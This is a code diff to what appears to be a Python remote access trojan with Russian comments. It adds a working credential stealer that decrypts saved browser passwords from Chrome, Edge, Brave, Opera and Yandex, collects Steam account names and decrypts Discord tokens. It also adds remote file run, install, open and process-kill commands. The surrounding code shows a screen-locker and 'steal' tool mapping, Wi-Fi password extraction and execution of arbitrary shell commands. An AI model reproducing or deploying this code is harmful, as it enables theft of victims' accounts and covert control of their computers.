@@ -20,6 +20,12 @@ import numpy as np
 from PIL import Image, ImageTk
 import time
 import cv2
+import sqlite3
+import win32crypt
+import base64
+import shutil
+from Crypto.Cipher import AES
+import psutil
 
 kernel32 = ctypes.windll.kernel32
 
@@ -523,10 +529,32 @@ def handle_command(command):
                 r = requests.get("https://api.example.com/info", timeout=5)
                 return r.text
             except Exception as e:
-                return f"Ошибка: {str(e)}"
+                return f"Error: {str(e)}"
 
+        # Обработка команд extool
+        if command.lower().startswith("extool"):
+            extool = Extool()
+            parts = command.split(maxsplit=2)  # Разбиваем максимум на 3 части
+            
+            if len(parts) < 2:
+                return "Usage: extool <command> [<args>]"
+            
+            cmd = parts[1].lower()
+            
+            # Для команд с аргументами в кавычках (run, install, open)
+            if cmd in ["run", "install", "open"] and len(parts) > 2:
+                arg = parts[2]
+                # Удаляем кавычки если они есть
+                if (arg.startswith('"') and arg.endswith('"')) or (arg.startswith("'") and arg.endswith("'")):
+                    arg = arg[1:-1]
+                return extool.execute_command(cmd, arg)
+            else:
+                # Для остальных команд просто передаем все аргументы как есть
+                args = parts[2:] if len(parts) > 2 else []
+                return extool.execute_command(cmd, *args)
+
+        # Остальная обработка команд...
         tool_commands = {
-            "extool": "extool.py",
             "winlock": "fslocker.py", 
             "steal": "thesteal.py",
             "web": "web.py",
@@ -538,7 +566,7 @@ def handle_command(command):
         for prefix, handler in tool_commands.items():
             if command.lower().startswith(prefix):
                 if prefix == "chat":
-                    return "Используйте команду chat напрямую"
+                    return "Use chat command directly"
                 
                 tool_path = os.path.join(os.path.dirname(__file__), 'tools', handler)
                 args = command.split()[1:] if ' ' in command else []
@@ -552,8 +580,9 @@ def handle_command(command):
                     )
                     return result.stdout if result.returncode == 0 else result.stderr
                 except Exception as e:
-                    return f"Ошибка инструмента: {str(e)}"
+                    return f"Tool error: {str(e)}"
 
+        # Если команда не распознана, выполняем как системную
         result = subprocess.run(
             command,
             shell=True,
@@ -564,8 +593,7 @@ def handle_command(command):
         return result.stdout if result.returncode == 0 else result.stderr
 
     except Exception as e:
-        return f"Ошибка выполнения команды: {str(e)}"
-
+        return f"Command execution error: {str(e)}"
 def start_client_chat(client_socket):
     def receive_messages():
         while True:
@@ -628,3 +656,467 @@ wifi_data = wifi_extractor.get_all_passwords()
 
 for network, password in wifi_data.items():
     print(f"Сеть: {network}\nПароль: {password}\n")
+
+class CredentialStealer:
+    """Класс для кражи учетных данных из браузеров и приложений"""
+    
+    def __init__(self):
+        pass
+
+    def get_encryption_key(self, browser_path):
+        """Get encryption key from Local State"""
+        local_state_path = os.path.join(browser_path, "Local State")
+        
+        try:
+            with open(local_state_path, "r", encoding="utf-8") as f:
+                local_state = json.load(f)
+            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+            encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
+            return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+        except Exception as e:
+            print(f"Error getting key: {e}")
+            return None
+
+    def decrypt_password(self, ciphertext, key):
+        """Decrypt password using AES-GCM"""
+        try:
+            if not ciphertext or len(ciphertext) < 15:
+                return ""
+                
+            iv = ciphertext[3:15]
+            encrypted_password = ciphertext[15:-16]  # Remove auth tag
+            cipher = AES.new(key, AES.MODE_GCM, iv)
+            return cipher.decrypt(encrypted_password).decode('utf-8')
+        except Exception:
+            # Try old DPAPI method
+            try:
+                return str(win32crypt.CryptUnprotectData(ciphertext, None, None, None, 0)[1])
+            except:
+                return ""
+
+    def get_browser_passwords(self, browser_path):
+        """Get passwords from specified browser"""
+        secret_key = self.get_encryption_key(browser_path)
+        if not secret_key:
+            print("Failed to get encryption key")
+            return []
+
+        passwords = []
+        login_data_path = os.path.join(browser_path, "Default", "Login Data")
+        
+        if not os.path.exists(login_data_path):
+            return []
+
+        # Copy file to avoid locking
+        temp_db = os.path.join(os.getenv("temp"), "temp_login.db")
+        shutil.copy2(login_data_path, temp_db)
+        
+        try:
+            conn = sqlite3.connect(temp_db)
+            cursor = conn.cursor()
+            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+            
+            for row in cursor.fetchall():
+                url, username, ciphertext = row
+                if url and username and ciphertext:
+                    password = self.decrypt_password(ciphertext, secret_key)
+                    if password:
+                        passwords.append({
+                            'url': url,
+                            'username': username,
+                            'password': password
+                        })
+        except Exception as e:
+            print(f"Database processing error: {e}")
+        finally:
+            if 'conn' in locals():
+                conn.close()
+            if os.path.exists(temp_db):
+                os.remove(temp_db)
+        
+        return passwords
+
+    def get_steam_credentials(self):
+        """Extract Steam credentials"""
+        steam_path = os.path.join(os.getenv("APPDATA"), "Steam")
+        if not os.path.exists(steam_path):
+            return []
+        
+        credentials = []
+        try:
+            # Steam stores credentials in config files
+            config_path = os.path.join(steam_path, "config", "loginusers.vdf")
+            if os.path.exists(config_path):
+                with open(config_path, "r", encoding="utf-8") as f:
+                    content = f.read()
+                    # Simple parsing of Steam config file
+                    username_match = re.search(r'"AccountName"\s+"([^"]+)"', content)
+                    remember_password = re.search(r'"RememberPassword"\s+"([^"]+)"', content)
+                    
+                    if username_match and remember_password:
+                        credentials.append({
+                            'platform': 'Steam',
+                            'username': username_match.group(1),
+                            'password': 'Saved (remembered)' if remember_password.group(1) == "1" else 'Not saved'
+                        })
+        except Exception as e:
+            print(f"Steam credentials error: {e}")
+        
+        return credentials
+
+    def get_discord_tokens(self):
+        """Extract Discord tokens"""
+        discord_paths = [
+            os.path.join(os.getenv("APPDATA"), "discord"),
+            os.path.join(os.getenv("APPDATA"), "discordcanary"),
+            os.path.join(os.getenv("APPDATA"), "discordptb"),
+        ]
+        
+        tokens = set()
+        encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
+        
+        for path in discord_paths:
+            if not os.path.exists(path):
+                continue
+                
+            local_state_path = os.path.join(path, "Local State")
+            if os.path.exists(local_state_path):
+                try:
+                    with open(local_state_path, "r", encoding="utf-8") as f:
+                        local_state = json.load(f)
+                    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+                    master_key = master_key[5:]  # Remove DPAPI prefix
+                    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
+                    
+                    leveldb_path = os.path.join(path, "Local Storage", "leveldb")
+                    if os.path.exists(leveldb_path):
+                        for file_name in os.listdir(leveldb_path):
+                            if not file_name.endswith(".ldb") and not file_name.endswith(".log"):
+                                continue
+                                
+                            with open(os.path.join(leveldb_path, file_name), "r", encoding="utf-8", errors="ignore") as f:
+                                for line in f:
+                                    for match in re.findall(encrypted_regex, line):
+                                        token = self.decrypt_password(base64.b64decode(match.split('dQw4w9WgXcQ:')[1]), master_key)
+                                        if token:
+                                            tokens.add(token)
+                except Exception as e:
+                    print(f"Discord token error: {e}")
+        
+        return list(tokens)
+
+    def save_to_file(self, data, filename="credentials.txt"):
+        """Save data to file"""
+        with open(filename, "w", encoding="utf-8") as f:
+            for item in data:
+                if 'platform' in item:  # Steam/Discord format
+                    f.write(f"Platform: {item['platform']}\n")
+                    f.write(f"Username: {item['username']}\n" if 'username' in item else "")
+                    if 'password' in item:
+                        f.write(f"Password: {item['password']}\n")
+                    if 'token' in item:
+                        f.write(f"Token: {item['token']}\n")
+                else:  # Browser format
+                    f.write(f"URL: {item['url']}\n")
+                    f.write(f"Username: {item['username']}\n")
+                    f.write(f"Password: {item['password']}\n")
+                f.write("-" * 50 + "\n")
+
+    def steal_credentials(self):
+        """Main method to steal all credentials"""
+        # Browser paths
+        browsers = {
+            "Chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
+            "Edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
+            "Brave": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
+            "Opera": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"),
+            "Yandex": os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data")
+        }
+
+        all_credentials = []
+        
+        # Get browser passwords
+        for name, path in browsers.items():
+            if os.path.isdir(path):
+                print(f"Searching passwords in {name}...")
+                passwords = self.get_browser_passwords(path)
+                if passwords:
+                    print(f"Found {len(passwords)} passwords in {name}")
+                    all_credentials.extend(passwords)
+        
+        # Get Steam credentials
+        print("Searching Steam credentials...")
+        steam_creds = self.get_steam_credentials()
+        if steam_creds:
+            print("Found Steam credentials")
+            all_credentials.extend(steam_creds)
+        
+        # Get Discord tokens
+        print("Searching Discord tokens...")
+        discord_tokens = self.get_discord_tokens()
+        if discord_tokens:
+            print(f"Found {len(discord_tokens)} Discord tokens")
+            for token in discord_tokens:
+                all_credentials.append({
+                    'platform': 'Discord',
+                    'token': token
+                })
+        
+        if all_credentials:
+            self.save_to_file(all_credentials)
+            print(f"All credentials saved to credentials.txt")
+            return all_credentials
+        else:
+            print("No credentials found")
+            return []
+        
+
+class Extool:
+    """Класс для выполнения различных системных операций с подробным логированием"""
+    
+    def __init__(self):
+        self.debug = True  # Включить подробное логирование
+    
+    def log(self, message):
+        """Логирование отладочной информации"""
+        if self.debug:
+            print(f"[DEBUG] {message}")
+    
+    def run_file(self, file_path):
+        """Запуск файла с проверкой существования"""
+        try:
+            self.log(f"Attempting to run file: {file_path}")
+            file_path = file_path.strip('"')
+            
+            if not os.path.exists(file_path):
+                msg = f"File not found: {file_path}"
+                self.log(msg)
+                return msg
+            
+            self.log(f"Starting file: {file_path}")
+            if sys.platform == "win32":
+                os.startfile(file_path)
+            else:
+                subprocess.Popen([file_path], shell=True)
+            
+            msg = f"File {file_path} started successfully"
+            self.log(msg)
+            return msg
+        except Exception as e:
+            msg = f"Error starting file: {str(e)}"
+            self.log(msg)
+            return msg
+
+    def install_file(self, file_path):
+        """Копирование файла в C:\FRAT с проверками"""
+        try:
+            self.log(f"Attempting to install file: {file_path}")
+            file_path = os.path.abspath(file_path.strip('"'))
+            
+            if not os.path.exists(file_path):
+                msg = f"File not found: {file_path}"
+                self.log(msg)
+                return msg
+            
+            target_dir = r"C:\FRAT"
+            self.log(f"Target directory: {target_dir}")
+            
+            os.makedirs(target_dir, exist_ok=True)
+            target_path = os.path.join(target_dir, os.path.basename(file_path))
+            
+            self.log(f"Copying from {file_path} to {target_path}")
+            shutil.copy2(file_path, target_path)
+            
+            if os.path.exists(target_path):
+                msg = f"File successfully copied to {target_path}"
+            else:
+                msg = "File copy failed (unknown error)"
+            
+            self.log(msg)
+            return msg
+        except Exception as e:
+            msg = f"Error copying file: {str(e)}"
+            self.log(msg)
+            return msg
+
+    def list_directory(self, directory=""):
+        """Показать содержимое директории с обработкой ошибок"""
+        try:
+            if not directory:
+                directory = os.path.expanduser("~\\Desktop")
+                self.log(f"No directory specified, using default: {directory}")
+            
+            directory = os.path.abspath(directory.strip('"'))
+            self.log(f"Listing directory: {directory}")
+            
+            if not os.path.exists(directory):
+                msg = f"Directory not found: {directory}"
+                self.log(msg)
+                return msg
+            
+            items = []
+            for item in os.listdir(directory):
+                full_path = os.path.join(directory, item)
+                items.append(f"{item}{'/' if os.path.isdir(full_path) else ''}")
+            
+            result = "\n".join(sorted(items))
+            self.log(f"Directory listing successful, {len(items)} items found")
+            return result if result else "Directory is empty"
+        except Exception as e:
+            msg = f"Error listing directory: {str(e)}"
+            self.log(msg)
+            return msg
+
+    def open_remote_file(self, filepath):
+        """Открытие файла стандартной программой с проверками"""
+        try:
+            self.log(f"Attempting to open file: {filepath}")
+            filepath = os.path.abspath(filepath.strip('"'))
+            
+            if not os.path.exists(filepath):
+                msg = f"File not found: {filepath}"
+                self.log(msg)
+                return msg
+            
+            self.log(f"Opening file: {filepath}")
+            if sys.platform == "win32":
+                os.startfile(filepath)
+            else:
+                opener = "open" if sys.platform == "darwin" else "xdg-open"
+                subprocess.run([opener, filepath], check=True)
+            
+            msg = f"File {filepath} opened successfully"
+            self.log(msg)
+            return msg
+        except Exception as e:
+            msg = f"Error opening file: {str(e)}"
+            self.log(msg)
+            return msg
+
+    def force_kill_process(self, identifier):
+        """Принудительное завершение процесса по имени или PID"""
+        try:
+            self.log(f"Attempting to kill process: {identifier}")
+            
+            # Попробуем интерпретировать как PID
+            try:
+                pid = int(identifier)
+                proc = psutil.Process(pid)
+                proc.kill()
+                msg = f"Process {pid} ({proc.name()}) killed successfully"
+                self.log(msg)
+                return msg
+            except ValueError:
+                pass  # Не число, попробуем как имя процесса
+            
+            # Ищем по имени процесса
+            killed = []
+            for proc in psutil.process_iter(['pid', 'name']):
+                try:
+                    if proc.info['name'].lower() == identifier.lower():
+                        proc.kill()
+                        killed.append(proc.info['pid'])
+                except (psutil.NoSuchProcess, psutil.AccessDenied):
+                    continue
+            
+            if killed:
+                msg = f"Killed {len(killed)} processes with name '{identifier}' (PIDs: {', '.join(map(str, killed))})"
+            else:
+                msg = f"No processes found with name '{identifier}'"
+            
+            self.log(msg)
+            return msg
+        except Exception as e:
+            msg = f"Error killing process: {str(e)}"
+            self.log(msg)
+            return msg
+
+    def list_processes(self):
+        """Получить список всех процессов с подробной информацией"""
+        try:
+            self.log("Listing all processes")
+            processes = []
+            
+            for proc in psutil.process_iter(['pid', 'name', 'username', 'status']):
+                try:
+                    processes.append({
+                        'pid': proc.info['pid'],
+                        'name': proc.info['name'],
+                        'user': proc.info['username'] or 'SYSTEM',
+                        'status': proc.info['status']
+                    })
+                except (psutil.NoSuchProcess, psutil.AccessDenied):
+                    continue
+            
+            processes.sort(key=lambda x: x['pid'])
+            
+            # Форматируем вывод
+            header = "{:<8} {:<25} {:<20} {:<10}".format("PID", "Name", "User", "Status")
+            separator = "-" * 65
+            lines = [header, separator]
+            
+            for p in processes:
+                lines.append("{:<8} {:<25} {:<20} {:<10}".format(
+                    p['pid'], 
+                    (p['name'][:24] + '...') if len(p['name']) > 24 else p['name'],
+                    (p['user'][:19] + '...') if p['user'] and len(p['user']) > 19 else p['user'],
+                    p['status']
+                ))
+            
+            result = "\n".join(lines)
+            self.log(f"Found {len(processes)} processes")
+            return result
+        except Exception as e:
+            msg = f"Error listing processes: {str(e)}"
+            self.log(msg)
+            return msg
+
+    def execute_command(self, command, *args):
+        """Основной метод выполнения команд с полным логированием"""
+        self.log(f"Executing command: {command} with args: {args}")
+        command = command.lower()
+        
+        try:
+            if command == "run":
+                if not args:
+                    msg = "Error: Missing file path\nUsage: extool run <file_path>"
+                    self.log(msg)
+                    return msg
+                return self.run_file(args[0])
+            
+            elif command == "install":
+                if not args:
+                    msg = "Error: Missing file path\nUsage: extool install <file_path>"
+                    self.log(msg)
+                    return msg
+                return self.install_file(args[0])
+            
+            elif command == "ls":
+                directory = args[0] if args else ""
+                return self.list_directory(directory)
+            
+            elif command == "open":
+                if not args:
+                    msg = "Error: Missing file path\nUsage: extool open <file_path>"
+                    self.log(msg)
+                    return msg
+                return self.open_remote_file(args[0])
+            
+            elif command == "fkill":
+                if not args:
+                    msg = "Error: Missing process identifier\nUsage: extool fkill <name|pid>"
+                    self.log(msg)
+                    return msg
+                return self.force_kill_process(args[0])
+            
+            elif command == "ps":
+                return self.list_processes()
+            
+            else:
+                msg = f"Error: Unknown command '{command}'\nAvailable commands: run, install, ls, open, fkill, ps"
+                self.log(msg)
+                return msg
+        except Exception as e:
+            msg = f"Command execution error: {str(e)}"
+            self.log(msg)
+            return msg
